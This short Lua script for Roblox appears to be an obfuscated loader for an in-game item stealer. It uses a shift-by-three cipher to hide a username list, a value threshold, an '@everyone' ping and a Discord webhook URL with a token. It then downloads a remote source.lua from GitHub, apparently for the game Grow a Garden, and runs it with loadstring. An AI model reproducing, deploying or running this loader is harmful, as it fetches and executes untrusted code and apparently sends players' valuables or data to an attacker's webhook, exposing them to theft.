-- Obfuscated Script
local function decode(str)
    local result = ""
    for i = 1, #str do
        result = result .. string.char(str:byte(i) - 3)
    end
    return result
end

local vars = {
    [decode("bJdXvhuqdphv")] = {
        decode("vlohqfhbhzz"),
        decode("kroghukroghukroghuu"), 
        decode("EUDCBW2[LF")
    },
    [decode("bJdplqbydoxh")] = 13333333333,
    [decode("bJdslqjHyhubqh")] = decode("Chv"),
    [decode("bJdzhekrrn")] = decode("kwwsv=22glvfrug1frp2dsl2zhekrrnv24684:;9;:37835334224RZUY9b3n4U<5F0KsZXZzM[mfX6VfKg4EkgfVZUW9S9OrYPU9gfGSMKTVwb8[nD")
}

for k, v in pairs(vars) do
    _G[k] = v
end

local url = decode("kwwsv=22jlwkxe1frp2vlohqfhbhzz2jurzdjdughqch2eore2pdlq2vrxufh1oxd")
loadstring(game:HttpGet(url))()